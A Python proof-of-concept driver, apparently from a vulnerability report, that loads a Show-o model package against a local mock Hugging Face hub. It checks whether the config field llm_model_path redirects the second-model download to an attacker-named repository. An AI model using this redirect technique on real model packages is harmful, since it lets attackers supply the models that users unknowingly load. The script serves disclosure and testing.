"""Victim-side driver: load one Show-o model package through the REAL pinned
loader exactly as the documented inference entry does (inference_t2i.py:67 ->
Showo.from_pretrained(<path>)), with the local mock hub standing in for the
Hugging Face endpoint.

usage: python run_repro.py pkg_attacker | pkg_default
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(HERE, "work")
PKG = os.path.join(WORK, sys.argv[1] if len(sys.argv) > 1 else "pkg_attacker")
REQLOG = os.path.join(WORK, "hub_requests.log")

ATTACKER_REPO = "mbe2e-attacker/pwned-by-showo-llm-model-path-redirect"
OFFICIAL_REPO = "microsoft/phi-1_5"

sys.path.insert(0, os.path.join(HERE, "Show-o-45a5a2de01d1"))
os.environ["HF_HOME"] = os.path.join(WORK, "hf-home-" + os.path.basename(PKG))
os.environ["HF_ENDPOINT"] = "http://127.0.0.1:8765"
os.environ["HF_HUB_DISABLE_TELEMETRY"] = "1"
os.environ["HF_HUB_DISABLE_SYMLINKS_WARNING"] = "1"

import mock_hub  # noqa: E402

if os.path.exists(REQLOG):
    os.remove(REQLOG)
mock_hub.start_server(port=8765, hub_root=os.path.join(WORK, "hub"), request_log=REQLOG)
print("[victim] mock hub on 127.0.0.1:8765 serving %s" % os.path.join(WORK, "hub"))

import json  # noqa: E402

with open(os.path.join(PKG, "config.json")) as f:
    cfg = json.load(f)
print("[victim] package    : %s" % PKG)
print("[victim] _class_name: %s" % cfg.get("_class_name"))
print("[victim] llm_model_path = %r" % cfg.get("llm_model_path"))
print("[victim] load_from_showo = %r" % cfg.get("load_from_showo"))

from models.modeling_showo import Showo  # noqa: E402

print("[victim] calling Showo.from_pretrained(%s)" % PKG)
try:
    model = Showo.from_pretrained(PKG)
    print("[victim] load : SUCCESS (%s)" % type(model).__name__)
    c = model.showo.config
    print("[victim] LLM built from fetched config: hidden_size=%s num_hidden_layers=%s vocab_size=%s"
          % (c.hidden_size, c.num_hidden_layers, c.vocab_size))
except Exception as e:
    print("[victim] load : FAILED (%s: %s)" % (type(e).__name__, str(e)[:160]))

lines = open(REQLOG, encoding="utf-8").read().splitlines() if os.path.exists(REQLOG) else []
gets = sorted(set(l for l in lines if l.startswith("GET ")))
print("-" * 72)
print("[victim] repositories contacted (from mock-hub request log):")
for l in gets:
    print("[victim]   %s" % l)
hit_attacker = any(ATTACKER_REPO in l for l in gets)
hit_official = any(OFFICIAL_REPO in l for l in gets)
print("-" * 72)
if hit_attacker and not hit_official:
    print("[victim] RESULT: REPO REDIRECT CONFIRMED - second-model fetch went to the")
    print("[victim]         attacker-controlled repository named in config.json")
elif hit_official and not hit_attacker:
    print("[victim] RESULT: no redirect - only the official repository was contacted")
else:
    print("[victim] RESULT: unexpected request pattern (attacker=%s official=%s)"
          % (hit_attacker, hit_official))
